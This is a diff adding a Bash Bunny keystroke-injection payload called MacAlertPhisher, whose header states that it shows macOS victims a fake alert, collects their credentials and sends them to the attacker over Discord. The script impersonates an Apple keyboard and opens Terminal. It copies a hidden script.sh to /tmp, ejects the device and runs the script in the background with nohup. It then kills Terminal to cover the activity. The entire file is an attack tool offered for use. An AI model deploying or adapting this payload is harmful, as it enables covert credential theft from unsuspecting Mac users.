@@ -1,0 +1,37 @@
+#!/bin/bash
+#
+# Title:         MacAlertPhisher
+# Description:   Creates a customizable alert that prompts for the victim's credentials and shares them with you via Discord. Even after unplugging the Bash Bunny.
+# Author:        90N45
+# Version:       1.0
+# Category:      Phishing
+# Attackmodes:   HID, STORAGE
+
+LED SETUP
+ATTACKMODE HID VID_0X05AC PID_0X021E STORAGE
+
+LED ATTACK
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 2500
+
+QUACK STRING "cp /Volumes/BashBunny/payloads/${SWITCH_POSITION}/script.sh /tmp/script.sh"
+QUACK ENTER
+QUACK DELAY 1000
+
+QUACK STRING "diskutil eject /Volumes/BashBunny/"
+QUACK ENTER
+QUACK STRING "chmod +x /tmp/script.sh && nohup bash /tmp/script.sh &> /dev/null &"
+QUACK ENTER
+QUACK DELAY 2000
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING "killall Terminal"
+QUACK ENTER
+
+LED FINISH
